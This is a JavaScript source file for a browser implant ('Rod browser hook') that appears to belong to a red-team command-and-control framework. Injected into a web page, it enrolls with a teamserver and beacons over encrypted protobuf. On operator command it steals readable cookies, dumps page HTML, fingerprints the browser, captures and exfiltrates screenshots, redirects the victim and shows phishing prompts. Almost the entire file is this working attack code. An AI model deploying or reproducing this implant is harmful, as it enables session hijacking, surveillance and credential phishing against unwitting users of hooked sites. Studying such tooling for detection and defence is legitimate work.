// Rod browser hook -- the Browser class's served script client.
//
// This file is the render template: the teamserver substitutes one bake
// object (below) and serves the result from the public edge under an
// unguessable route id. It is deliberately dependency-free vanilla
// JavaScript -- no fetch beyond the two routes it owns, no CDN, no
// bundler -- because it must run inside any hooked page without leaving
// an import trail (architecture.md Sec 5.2, Sec 8; extending/implants.md,
// "The browser hook").
//
// Wire obligations, all shared with every other implant:
//   - enrollment: POST {enrollUrl}, JSON body with class "browser"
//   - contact:    POST {beaconUrl}, varint-delimited rod.v1 protobuf
//                 frames, sealed (AES-256-GCM, the R1 body) under the
//                 baked key when one exists, else the plaintext framed
//                 body -- the two postures the mint chooses.
// The protobuf codec below hand-encodes the messages a Tier 0 poll client
// speaks: HandshakeRequest, HandshakeResponse, TaskRequest, TaskResult,
// and ExfilChunk for bulk results.
//
// Identity is per browser tab: sessionStorage carries the implant id and
// the seal counter, so a reload resumes instead of re-enrolling. A
// context that blocks storage re-enrolls on every reload, spending one
// token use each time -- the mint's token budget is the enrollment
// budget.
//
// Tasking-signature verification (Tier 1) is a named limit of this
// client: verifying would mean walking an X.509 chain in vanilla
// JavaScript. In the sealed posture the response's GCM tag under the
// baked key is the server authentication; the cleartext posture carries
// neither and is the lab-debug shape (extending/implants.md).
'use strict';

// The bake the renderer substitutes. Everything the hook knows about its
// deployment lives here: where to contact, the credential, the seal, the
// cadence, and the verbs it may run.
var ROD_HOOK_BAKE = __ROD_BAKE_JSON__;

(function () {
  var bake = ROD_HOOK_BAKE;
  var debug = /[?&#]rodhook=debug\b/.test(location.href);

  function log() {
    if (debug && window.console) {
      window.console.log.apply(window.console, ['[rod-hook]'].concat([].slice.call(arguments)));
    }
  }

  // ---- byte helpers ---------------------------------------------------

  function utf8(text) {
    return new TextEncoder().encode(text);
  }

  function b64ToBytes(text) {
    var bin = atob(text);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return bytes;
  }

  function bytesToB64(bytes) {
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  }

  function concatBytes(parts) {
    var total = 0;
    for (var i = 0; i < parts.length; i++) total += parts[i].length;
    var out = new Uint8Array(total);
    var at = 0;
    for (var j = 0; j < parts.length; j++) {
      out.set(parts[j], at);
      at += parts[j].length;
    }
    return out;
  }

  // ---- protobuf micro-codec --------------------------------------------
  // Wire types the five messages use: 0 varint, 2 length-delimited, plus
  // the handshake's fixed64 doubles. proto3 defaults are omitted.

  function Writer() {
    this.chunks = [];
    this.length = 0;
  }

  Writer.prototype.bytes = function (tag, value) {
    this.varint((tag << 3) | 2);
    this.varint(value.length);
    this.chunks.push(value);
    this.length += value.length;
  };

  Writer.prototype.str = function (tag, value) {
    if (!value) return;
    this.bytes(tag, utf8(value));
  };

  Writer.prototype.varintField = function (tag, value) {
    if (!value) return;
    this.varint((tag << 3) | 0);
    this.varint(value);
  };

  Writer.prototype.doubleField = function (tag, value) {
    if (value == null) return;
    this.varint((tag << 3) | 1);
    var buf = new ArrayBuffer(8);
    new DataView(buf).setFloat64(0, value, true);
    this.chunks.push(new Uint8Array(buf));
    this.length += 8;
  };

  Writer.prototype.varint = function (value) {
    var out = [];
    var v = value >>> 0;
    while (v >= 0x80) {
      out.push((v & 0xff) | 0x80);
      v = v >>> 7;
    }
    out.push(v);
    var arr = new Uint8Array(out);
    this.chunks.push(arr);
    this.length += arr.length;
  };

  Writer.prototype.finish = function () {
    return concatBytes(this.chunks);
  };

  function Reader(bytes) {
    this.bytes = bytes;
    this.pos = 0;
  }

  Reader.prototype.readVarint = function () {
    var value = 0;
    var shift = 0;
    for (var consumed = 0; consumed < 5; consumed++) {
      if (this.pos >= this.bytes.length) throw new Error('truncated varint');
      var b = this.bytes[this.pos++];
      value += (b & 0x7f) * Math.pow(2, shift);
      if ((b & 0x80) === 0) return value;
      shift += 7;
    }
    throw new Error('overlong varint');
  };

  Reader.prototype.readTag = function () {
    if (this.pos >= this.bytes.length) return 0;
    return this.readVarint();
  };

  Reader.prototype.readBytes = function () {
    var length = this.readVarint();
    if (this.pos + length > this.bytes.length) throw new Error('truncated field');
    var out = this.bytes.slice(this.pos, this.pos + length);
    this.pos += length;
    return out;
  };

  Reader.prototype.readString = function () {
    return new TextDecoder().decode(this.readBytes());
  };

  Reader.prototype.skip = function (tag) {
    var wire = tag & 7;
    if (wire === 0) this.readVarint();
    else if (wire === 1) this.pos += 8;
    else if (wire === 2) this.readBytes();
    else if (wire === 5) this.pos += 4;
    else throw new Error('unsupported wire type ' + wire);
  };

  // ---- frames -----------------------------------------------------------

  function encodeFrames(frames) {
    var parts = [];
    for (var i = 0; i < frames.length; i++) {
      var w = new Writer();
      w.bytes(2, frames[i].payload);
      w.varintField(3, frames[i].kind || 0);
      var marshaled = w.finish();
      var prefix = new Writer();
      prefix.varint(marshaled.length);
      parts.push(prefix.finish());
      parts.push(marshaled);
    }
    return concatBytes(parts);
  }

  function parseFrames(bytes) {
    var frames = [];
    var r = new Reader(bytes);
    while (r.pos < bytes.length) {
      var length = r.readVarint();
      if (r.pos + length > bytes.length) throw new Error('truncated frame');
      var body = bytes.slice(r.pos, r.pos + length);
      r.pos += length;
      var fr = new Reader(body);
      var payload = new Uint8Array(0);
      var kind = 0;
      var tag;
      while ((tag = fr.readTag()) !== 0) {
        if (tag === 0x12) payload = fr.readBytes();
        else if (tag === 0x18) kind = fr.readVarint();
        else fr.skip(tag);
      }
      frames.push({ payload: payload, kind: kind });
    }
    return frames;
  }

  // ---- messages -----------------------------------------------------------

  function handshakeBytes(implantId, verbs, sleep, jitter) {
    var version = new Writer();
    version.varintField(1, 1);
    version.varintField(2, 0);
    var w = new Writer();
    w.bytes(1, version.finish());
    w.str(2, implantId);
    for (var i = 0; i < verbs.length; i++) w.str(3, verbs[i]);
    w.doubleField(6, sleep);
    w.doubleField(7, jitter);
    return w.finish();
  }

  function taskResultBytes(taskId, ok, output) {
    var w = new Writer();
    w.str(1, taskId);
    w.varintField(2, ok ? 1 : 2);
    w.str(3, output);
    return w.finish();
  }

  function exfilChunkBytes(taskId, name, contentType, sequence, terminal, data) {
    var w = new Writer();
    w.str(1, taskId);
    w.str(2, name);
    w.str(3, contentType);
    w.varintField(4, sequence);
    w.varintField(5, terminal ? 1 : 0);
    w.bytes(6, data);
    return w.finish();
  }

  function parseHandshakeResponse(payload) {
    var r = new Reader(payload);
    var out = { status: 0, engagementId: '' };
    var tag;
    while ((tag = r.readTag()) !== 0) {
      if (tag === 0x08) out.status = r.readVarint();
      else if (tag === 0x1a) out.engagementId = r.readString();
      else r.skip(tag);
    }
    return out;
  }

  function parseTaskRequest(payload) {
    var r = new Reader(payload);
    var out = { taskId: '', verb: '', arguments: '' };
    var tag;
    while ((tag = r.readTag()) !== 0) {
      if (tag === 0x0a) out.taskId = r.readString();
      else if (tag === 0x12) out.verb = r.readString();
      else if (tag === 0x1a) out.arguments = r.readString();
      else r.skip(tag);
    }
    return out;
  }

  // ---- seal ----------------------------------------------------------------
  // The R1 body: "R1" || keyId(16) || nonce(12) || ciphertext || tag(16),
  // AES-256-GCM under the baked key (the wire value is its base64). The
  // key id rides the baked prefix exactly as the server packed it, so no
  // GUID endianness lands here. WebCrypto appends the 16-byte tag after
  // the ciphertext, the same layout the server reads.

  var seal = bake.bakedKey
    ? (function () {
        var packed = b64ToBytes(bake.bakedKey);
        var keyId = packed.slice(0, 16);
        var rawKey = packed.slice(16, 48);
        var subtle = crypto.subtle;
        var keyPromise = subtle.importKey('raw', rawKey, { name: 'AES-GCM' }, false, ['encrypt', 'decrypt']);
        return {
          keyId: keyId,
          ready: keyPromise,
          seal: function (plaintext, aad) {
            return keyPromise.then(function (key) {
              var nonce = crypto.getRandomValues(new Uint8Array(12));
              return subtle
                .encrypt({ name: 'AES-GCM', iv: nonce, additionalData: utf8(aad), tagLength: 128 }, key, plaintext)
                .then(function (sealed) {
                  return concatBytes([utf8('R1'), keyId, nonce, new Uint8Array(sealed)]);
                });
            });
          },
          open: function (body, aad) {
            if (body.length < 2 + 16 + 12 + 16) throw new Error('sealed body too short');
            if (body[0] !== 0x52 || body[1] !== 0x31) throw new Error('not the R1 shape');
            var nonce = body.slice(18, 30);
            var sealed = body.slice(30);
            return keyPromise.then(function (key) {
              return subtle
                .decrypt({ name: 'AES-GCM', iv: nonce, additionalData: utf8(aad), tagLength: 128 }, key, sealed)
                .then(function (plaintext) {
                  // decrypt resolves an ArrayBuffer; every reader in this
                  // script speaks Uint8Array.
                  return new Uint8Array(plaintext);
                });
            });
          },
        };
      })()
    : null;

  // ---- identity --------------------------------------------------------------
  // Per tab, per origin: sessionStorage survives reloads and navigation
  // inside the origin, which is exactly the resume the seal counter needs.

  var storeKey = 'rod-hook:' + bake.beaconUrl;

  function loadState() {
    try {
      var raw = sessionStorage.getItem(storeKey);
      return raw ? JSON.parse(raw) : null;
    } catch (e) {
      return null; // storage blocked: in-memory identity, re-enroll on reload
    }
  }

  function saveState() {
    try {
      sessionStorage.setItem(storeKey, JSON.stringify(state));
    } catch (e) {
      /* blocked storage: the identity simply will not resume */
    }
  }

  function dropState() {
    state = null;
    try {
      sessionStorage.removeItem(storeKey);
    } catch (e) {
      /* nothing stored */
    }
  }

  var state = loadState();
  var outbox = []; // {payload, kind} frames riding the next contact
  var stopped = false;

  function killDatePassed() {
    if (!bake.killDate) return false;
    return Date.now() > Date.parse(bake.killDate);
  }

  // ---- enrollment ---------------------------------------------------------------

  function enroll() {
    var body = {
      deployTokenSecret: bake.token,
      class: 'browser',
      hostname: location.hostname || '(unknown)',
      os: navigator.platform || '(unknown)',
      arch: 'browser',
      username: '',
      sleepSeconds: bake.sleep,
      jitterSeconds: bake.jitter,
    };
    if (bake.killDate) body.killDate = bake.killDate;

    // The Tier 0 keypair obligation, met only where crypto.subtle exists
    // (the sealed posture); the cleartext posture enrolls without it.
    var keypair = seal
      ? crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign'])
      : Promise.resolve(null);

    return keypair
      .then(function (pair) {
        if (!pair) return Promise.resolve(null);
        return crypto.subtle.exportKey('spki', pair.publicKey).then(function (spki) {
          body.publicKey = bytesToB64(new Uint8Array(spki));
        });
      })
      .then(function () {
        var wire;
        if (seal) {
          // A JSON string literal wrapping the base64 R1 body: the enroll
          // route's sealed shape, under the enroll purpose tag.
          return seal
            .seal(utf8(JSON.stringify(body)), 'rod-envelope-v1')
            .then(function (sealed) {
              return JSON.stringify(bytesToB64(sealed));
            });
        }
        return JSON.stringify(body);
      })
      .then(function (wire) {
        return fetch(bake.enrollUrl, { method: 'POST', body: wire }).then(function (response) {
          if (response.status === 401) throw { permanent: true, message: 'the token was refused' };
          if (!response.ok) throw new Error('enroll answered ' + response.status);
          return response.json();
        });
      })
      .then(function (outcome) {
        if (outcome.status !== 1) throw { permanent: true, message: 'enroll refused (status ' + outcome.status + ')' };
        log('enrolled as', outcome.implantId);
        return outcome.implantId;
      });
  }

  // ---- contact --------------------------------------------------------------------

  function sleepSeconds() {
    var slack = bake.jitter > 0 ? bake.jitter * (2 * Math.random() - 1) : 0;
    return Math.max(0.5, bake.sleep + slack);
  }

  function schedule() {
    if (stopped) return;
    setTimeout(tick, sleepSeconds() * 1000);
  }

  function tick() {
    if (stopped) return;
    if (killDatePassed()) {
      stopped = true;
      return;
    }
    contact().then(
      function () {
        schedule();
      },
      function (error) {
        if (error && error.permanent) {
          // The budget or the key is gone; retrying spends nothing but
          // noise, so the hook goes quiet.
          stopped = true;
          log('stopping:', error.message);
          return;
        }
        log('contact failed:', error && error.message);
        schedule();
      },
    );
  }

  function contact() {
    var enrollment = state ? Promise.resolve(state.id) : enroll().then(function (id) {
      state = { id: id, counter: 0 };
      saveState();
      return id;
    });

    return enrollment.then(function (implantId) {
      // The queued frames ride as a snapshot: a failed contact re-queues
      // them (results are the task's answers, losing one strands the task
      // Dispatched forever), while anything a handler queues mid-flight
      // stays in the live outbox for the next cycle.
      var pending = outbox;
      outbox = [];
      var frames = [{ payload: handshakeBytes(implantId, bake.verbs, bake.sleep, bake.jitter), kind: 0 }].concat(pending);
      var plaintext = encodeFrames(frames);

      var request;
      if (seal) {
        state.counter++;
        saveState();
        // The counter is an 8-byte unsigned big-endian integer; a double's
        // bits hold every integer up to 2^53 exactly, so writing the count
        // as a big-endian float64 is writing it as the integer bytes.
        var counter = new ArrayBuffer(8);
        new DataView(counter).setFloat64(0, state.counter, false);
        request = seal
          .seal(concatBytes([new Uint8Array(counter), plaintext]), 'rod-contact-v1')
          .then(function (sealed) {
            return fetch(bake.beaconUrl, { method: 'POST', body: bytesToB64(sealed) });
          });
      } else {
        request = fetch(bake.beaconUrl, { method: 'POST', body: plaintext });
      }

      return request.then(
        function (response) {
          if (response.status === 401) {
            // A replayed or mis-keyed body: the server's counter floor
            // outlives this tab's memory (storage blocked, or the row aged
            // past it). One fresh enrollment re-establishes identity.
            dropState();
            log('contact refused; dropping identity for a fresh enroll');
            return;
          }
          if (!response.ok) {
            // The answers this contact carried are still the task's
            // answers: put them back for the next cycle.
            outbox = pending.concat(outbox);
            throw new Error('beacon answered ' + response.status);
          }

          if (seal) {
            return response
              .text()
              .then(function (text) {
                return seal.open(b64ToBytes(text.trim()), 'rod-contact-response-v1');
              })
              .then(readInbound);
          }
          return response.arrayBuffer().then(function (buffer) {
            readInbound(new Uint8Array(buffer));
          });
        },
        function (error) {
          outbox = pending.concat(outbox);
          throw error;
        },
      );
    });
  }

  // Runs the tasking one contact carries: a non-OK handshake is
  // authoritative and permanent; each task's answer queues for the fast
  // follow-up contact the poll discipline answers with.
  function readInbound(bodyBytes) {
    var inbound = parseFrames(bodyBytes);
    if (!inbound.length) return;
    var handshake = parseHandshakeResponse(inbound[0].payload);
    if (handshake.status !== 1) {
      stopped = true;
      log('handshake refused (status ' + handshake.status + '); stopping');
      return;
    }

    var runs = [];
    for (var i = 1; i < inbound.length; i++) {
      var task = parseTaskRequest(inbound[i].payload);
      if (!task.taskId || !task.verb) continue;
      runs.push(runTask(task));
    }
    if (runs.length) {
      // The follow-up rides once the handlers settle, not the cadence: the
      // operator reads the answer seconds after issuing it, the
      // store-and-forward shape the poll discipline already models.
      Promise.all(runs).then(function () {
        if (outbox.length) setTimeout(tick, 1000);
      });
    }
  }

  // ---- verbs -------------------------------------------------------------------------

  function runTask(task) {
    var handler = handlers[task.verb];
    var run = handler
      ? Promise.resolve()
          .then(function () {
            return handler(task.arguments || '', task);
          })
          .then(function (answer) {
            queueResult(task, true, answer);
          })
      : Promise.resolve().then(function () {
          throw new Error('no handler for ' + task.verb);
        });
    run.catch(function (error) {
      queueResult(task, false, {
        output: String((error && error.message) || error),
      });
    });
    return run;
  }

  function queueResult(task, ok, answer) {
    answer = answer || {};
    if (ok && answer.chunks) {
      for (var i = 0; i < answer.chunks.length; i++) {
        outbox.push({ payload: answer.chunks[i], kind: 2 }); // FRAME_KIND_EXFIL_CHUNK
      }
    }
    outbox.push({ payload: taskResultBytes(task.taskId, ok, answer.output != null ? answer.output : ''), kind: 0 });
  }

  function fingerprint() {
    var facts = {
      pageUrl: location.href,
      origin: location.origin,
      referrer: document.referrer || '',
      userAgent: navigator.userAgent,
      platform: navigator.platform || '',
      language: navigator.language || '',
      languages: (navigator.languages || []).slice(),
      cookieEnabled: !!navigator.cookieEnabled,
      webdriver: !!navigator.webdriver,
      screen: (window.screen && window.screen.width + 'x' + window.screen.height) || '',
      colorDepth: (window.screen && window.screen.colorDepth) || 0,
      devicePixelRatio: window.devicePixelRatio || 1,
      timezone: (window.Intl && Intl.DateTimeFormat().resolvedOptions().timeZone) || '',
      hardwareConcurrency: navigator.hardwareConcurrency || 0,
      touchPoints: navigator.maxTouchPoints || 0,
      hookDate: new Date().toISOString(),
    };
    return { output: JSON.stringify(facts, null, 2) };
  }

  function readCookies() {
    // The browser's own boundary: only the current origin's non-HttpOnly
    // cookies are readable, by construction, not by choice.
    return { output: document.cookie || '(no readable cookies)' };
  }

  var domCap = 1024 * 1024;

  function readDom(selector) {
    var root = selector ? document.querySelector(selector) : document.documentElement;
    if (!root) throw new Error('selector matched nothing');
    var html = root.outerHTML || '';
    if (html.length > domCap) html = html.slice(0, domCap) + '\n(truncated at 1 MiB)';
    return { output: html };
  }

  // The reference rasterizer: serialize the DOM into an SVG foreignObject
  // and draw it to a canvas. SVG loaded as an image cannot fetch external
  // resources, so external stylesheets and imagery do not apply -- the
  // capture is structure and inline styling, a visual confirmation of
  // page content rather than a pixel-perfect screenshot. Pixel-accurate
  // capture is a fork's job (the crate-fork seam's spirit); this is the
  // documented reference behavior.
  function screenshot(args, task) {
    var clone = document.documentElement.cloneNode(true);
    var strip = clone.querySelectorAll('script,iframe,img,object,embed,video,audio,source,link');
    for (var i = 0; i < strip.length; i++) strip[i].parentNode.removeChild(strip[i]);
    var width = Math.max(document.documentElement.scrollWidth, 1);
    var height = Math.max(document.documentElement.scrollHeight, 1);
    var svg =
      '<svg xmlns="http://www.w3.org/2000/svg" width="' +
      width +
      '" height="' +
      height +
      '">' +
      '<foreignObject width="100%" height="100%">' +
      '<div xmlns="http://www.w3.org/1999/xhtml" style="width:' +
      width +
      'px;height:' +
      height +
      'px;">' +
      clone.outerHTML +
      '</div></foreignObject></svg>';
    var url = URL.createObjectURL(new Blob([svg], { type: 'image/svg+xml' }));
    var img = new Image();
    return new Promise(function (resolve, reject) {
      img.onload = function () {
        try {
          var canvas = document.createElement('canvas');
          canvas.width = width;
          canvas.height = height;
          canvas.getContext('2d').drawImage(img, 0, 0);
          canvas.toBlob(function (blob) {
            if (!blob) {
              reject(new Error('the canvas produced no image'));
              return;
            }
            blob
              .arrayBuffer()
              .then(function (buffer) {
                var bytes = new Uint8Array(buffer);
                var name = 'screenshot-' + task.taskId + '.png';
                var chunks = [];
                var step = 512 * 1024;
                for (var at = 0; at < bytes.length; at += step) {
                  chunks.push(
                    exfilChunkBytes(task.taskId, name, 'image/png', chunks.length, at + step >= bytes.length, bytes.slice(at, Math.min(at + step, bytes.length))),
                  );
                }
                URL.revokeObjectURL(url);
                resolve({ output: name, chunks: chunks });
              })
              .catch(reject);
          }, 'image/png');
        } catch (e) {
          URL.revokeObjectURL(url);
          reject(e);
        }
      };
      img.onerror = function () {
        URL.revokeObjectURL(url);
        reject(new Error('the page did not rasterize (external styles or imagery do not apply inside the capture)'));
      };
      img.src = url;
    });
  }

  function redirect(target) {
    if (!target) throw new Error('redirect needs a URL');
    // The result rides the fast follow-up contact first: navigating
    // destroys the page and the hook with it.
    setTimeout(function () {
      location.href = target;
    }, 1500);
    return { output: 'navigating to ' + target };
  }

  function promptUser(text) {
    var answer = window.prompt(text || '');
    return { output: answer === null ? '(dismissed)' : answer };
  }

  var handlers = {
    'browser.fingerprint': fingerprint,
    'browser.cookies': readCookies,
    'browser.dom': readDom,
    'browser.screenshot': screenshot,
    'browser.redirect': redirect,
    'browser.prompt': promptUser,
  };

  // ---- boot -----------------------------------------------------------------------------

  if (!bake.verbs || !bake.verbs.length) {
    log('no verbs baked; nothing to run');
    return;
  }

  log('hook loaded', seal ? '(sealed)' : '(cleartext)', 'against', bake.beaconUrl);
  tick();
})();
